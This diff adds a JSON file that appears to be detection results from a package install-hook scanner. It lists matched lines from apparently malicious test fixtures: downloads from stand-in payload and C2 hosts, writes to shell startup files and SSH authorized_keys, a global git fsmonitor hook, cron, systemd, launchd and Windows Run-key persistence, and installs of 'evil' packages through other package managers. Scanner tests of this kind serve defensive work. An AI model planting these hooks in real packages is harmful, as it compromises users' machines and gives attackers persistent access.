@@ -1,0 +1,155 @@
+{
+  "rows": [
+    {
+      "family": "T2-network",
+      "pattern": "t2-js-net",
+      "hits": 4,
+      "first": "T2-js/postinstall.js:3: const https = require(\"https\")",
+      "all": [
+        "T2-js/postinstall.js:3: const https = require(\"https\")",
+        "T2-js/postinstall.js:7: const res = await fetch(url)",
+        "T2-js/postinstall.js:11: execSync(\"curl -sSL https://payload.example.com/agent.bin -o /tmp/agent.",
+        "T2-js/postinstall.js:12: https.get(\"http://metrics.example.com/telemetry\", () => {})"
+      ]
+    },
+    {
+      "family": "T2-network",
+      "pattern": "t2-py-net",
+      "hits": 3,
+      "first": "T2-py/setup.py:3: import urllib.request",
+      "all": [
+        "T2-py/setup.py:3: import urllib.request",
+        "T2-py/setup.py:7: urllib.request.urlretrieve(\"https://payload.example.com/blob\", \"blob.bin",
+        "T2-py/setup.py:8: requests.get(\"https://c2.example.com/checkin\")"
+      ]
+    },
+    {
+      "family": "T2-network",
+      "pattern": "t2-rs-net",
+      "hits": 3,
+      "first": "T2-rs/Cargo.toml:8: reqwest = \"0.12\"",
+      "all": [
+        "T2-rs/Cargo.toml:8: reqwest = \"0.12\"",
+        "T2-rs/Cargo.toml:9: ureq = \"2\"",
+        "T2-rs/build.rs:3: let _resp = reqwest::blocking::get(\"https://payload.example.com/toolchai"
+      ]
+    },
+    {
+      "family": "T2-network",
+      "pattern": "t2-rb-net",
+      "hits": 2,
+      "first": "T2-rb/extconf.rb:3: require 'open-uri'",
+      "all": [
+        "T2-rb/extconf.rb:3: require 'open-uri'",
+        "T2-rb/extconf.rb:5: Net::HTTP.get(URI('https://payload.example.com/ext.tar.gz'))"
+      ]
+    },
+    {
+      "family": "T3-out-of-tree",
+      "pattern": "t3-dotfile",
+      "hits": 10,
+      "first": "T3-rc/postinstall.js:5: fs.appendFileSync(process.env.HOME + \"/.bashrc\", '\\nexport PATH=\"$HOME/.",
+      "all": [
+        "T3-rc/postinstall.js:5: fs.appendFileSync(process.env.HOME + \"/.bashrc\", '\\nexport PATH=\"$HOME/.",
+        "T3-rc/postinstall.js:6: fs.appendFileSync(process.env.HOME + \"/.zshrc\", \"\\nsource ~/.evil/init.z",
+        "T3-rc/postinstall.js:7: fs.appendFileSync(process.env.HOME + \"/.profile\", \"\\n. ~/.evil/profile.s",
+        "T3-rc/postinstall.js:8: fs.writeFileSync(process.env.HOME + \"/.config/evil/launch.sh\", \"#!/bin/s",
+        "T3-rc/postinstall.js:9: fs.appendFileSync(\"/etc/profile.d/evil.sh\", \"export PATH=/opt/evil/bin:$",
+        "T3-rc/postinstall.js:10: fs.appendFileSync(process.env.HOME + \"/.ssh/authorized_keys\", \"ssh-ed255",
+        "T4-unix/postinstall.sh:3: mkdir -p \"$HOME/.config/systemd/user\"",
+        "T4-unix/postinstall.sh:4: cat > \"$HOME/.config/systemd/user/evil-agent.service\" <<'UNIT'",
+        "T4-unix/postinstall.sh:13: mkdir -p \"$HOME/.config/autostart\"",
+        "T4-unix/postinstall.sh:14: cp evil.desktop \"$HOME/.config/autostart/evil.desktop\""
+      ]
+    },
+    {
+      "family": "T3-out-of-tree",
+      "pattern": "t3-win-path-carrier",
+      "hits": 6,
+      "first": "T3-winpath/install.ps1:3: $dir = \"$env:USERPROFILE\\.evil\\Scripts\"",
+      "all": [
+        "T3-winpath/install.ps1:3: $dir = \"$env:USERPROFILE\\.evil\\Scripts\"",
+        "T3-winpath/install.ps1:4: setx /F PATH \"$env:PATH;$dir\"",
+        "T3-winpath/install.ps1:5: New-ItemProperty -Path 'HKCU:\\Environment' -Name Path -Value \"%USERPROFI",
+        "T3-winpath/install.ps1:6: [Environment]::SetEnvironmentVariable(\"Path\", \"$($env:Path);$dir\", \"User",
+        "T4-win/postinstall.cmd:2: schtasks /Create /TN \"EvilAgent\" /TR \"%USERPROFILE%\\.evil\\agent.exe\" /SC",
+        "T4-win/postinstall.cmd:3: reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v EvilAgen"
+      ]
+    },
+    {
+      "family": "T3-out-of-tree",
+      "pattern": "t3-path-export",
+      "hits": 2,
+      "first": "T3-rc/postinstall.js:5: fs.appendFileSync(process.env.HOME + \"/.bashrc\", '\\nexport PATH=\"$HOME/.",
+      "all": [
+        "T3-rc/postinstall.js:5: fs.appendFileSync(process.env.HOME + \"/.bashrc\", '\\nexport PATH=\"$HOME/.",
+        "T3-rc/postinstall.js:9: fs.appendFileSync(\"/etc/profile.d/evil.sh\", \"export PATH=/opt/evil/bin:$"
+      ]
+    },
+    {
+      "family": "T3-out-of-tree",
+      "pattern": "t3-git-global",
+      "hits": 1,
+      "first": "T3-rc/postinstall.js:11: execFileSync(\"git\", [\"config\", \"--global\", \"core.fsmonitor\", \"~/.evil/mo",
+      "all": [
+        "T3-rc/postinstall.js:11: execFileSync(\"git\", [\"config\", \"--global\", \"core.fsmonitor\", \"~/.evil/mo"
+      ]
+    },
+    {
+      "family": "T4-persistence",
+      "pattern": "t4-unix",
+      "hits": 7,
+      "first": "T4-unix/postinstall.sh:3: mkdir -p \"$HOME/.config/systemd/user\"",
+      "all": [
+        "T4-unix/postinstall.sh:3: mkdir -p \"$HOME/.config/systemd/user\"",
+        "T4-unix/postinstall.sh:4: cat > \"$HOME/.config/systemd/user/evil-agent.service\" <<'UNIT'",
+        "T4-unix/postinstall.sh:8: systemctl --user enable --now evil-agent.service",
+        "T4-unix/postinstall.sh:9: ( crontab -l 2>/dev/null; echo \"*/5 * * * * $HOME/.evil/bin/beacon\" ) | ",
+        "T4-unix/postinstall.sh:10: mkdir -p \"$HOME/Library/LaunchAgents\"",
+        "T4-unix/postinstall.sh:11: cp evil.agent.plist \"$HOME/Library/LaunchAgents/com.example.evil.plist\"",
+        "T4-unix/postinstall.sh:12: launchctl load \"$HOME/Library/LaunchAgents/com.example.evil.plist\""
+      ]
+    },
+    {
+      "family": "T4-persistence",
+      "pattern": "t4-win",
+      "hits": 2,
+      "first": "T4-win/postinstall.cmd:2: schtasks /Create /TN \"EvilAgent\" /TR \"%USERPROFILE%\\.evil\\agent.exe\" /SC",
+      "all": [
+        "T4-win/postinstall.cmd:2: schtasks /Create /TN \"EvilAgent\" /TR \"%USERPROFILE%\\.evil\\agent.exe\" /SC",
+        "T4-win/postinstall.cmd:3: reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v EvilAgen"
+      ]
+    },
+    {
+      "family": "cross-manager",
+      "pattern": "xmgr-spawn",
+      "hits": 8,
+      "first": "cross-manager/postinstall.js:5: spawnSync(\"pip\", [\"install\", \"--user\", \"evil-helper\"])",
+      "all": [
+        "cross-manager/postinstall.js:5: spawnSync(\"pip\", [\"install\", \"--user\", \"evil-helper\"])",
+        "cross-manager/postinstall.js:7: execFileSync(\"easy_install\", [\"evil3\"])",
+        "cross-manager/postinstall.js:8: spawnSync(\"npm\", [\"install\", \"-g\", \"evil-plugin\"])",
+        "cross-manager/postinstall.js:9: spawnSync(\"yarn\", [\"global\", \"add\", \"evil-yarn\"])",
+        "cross-manager/postinstall.js:10: spawnSync(\"pnpm\", [\"add\", \"-g\", \"evil-pnpm\"])",
+        "cross-manager/postinstall.js:11: spawnSync(\"gem\", [\"install\", \"evil-gem\"])",
+        "cross-manager/postinstall.js:12: spawnSync(\"cargo\", [\"install\", \"evil-crate\"])",
+        "cross-manager/postinstall.js:13: spawnSync(\"uv\", [\"pip\", \"install\", \"--user\", \"evil-uv\"])"
+      ]
+    },
+    {
+      "family": "cross-manager",
+      "pattern": "xmgr-shell",
+      "hits": 1,
+      "first": "cross-manager/postinstall.js:6: execSync(\"python -m pip install --user evil-helper2\")",
+      "all": [
+        "cross-manager/postinstall.js:6: execSync(\"python -m pip install --user evil-helper2\")"
+      ]
+    }
+  ],
+  "hitByFamily": {
+    "T2-network": 12,
+    "T3-out-of-tree": 19,
+    "T4-persistence": 9,
+    "cross-manager": 9
+  }
+}
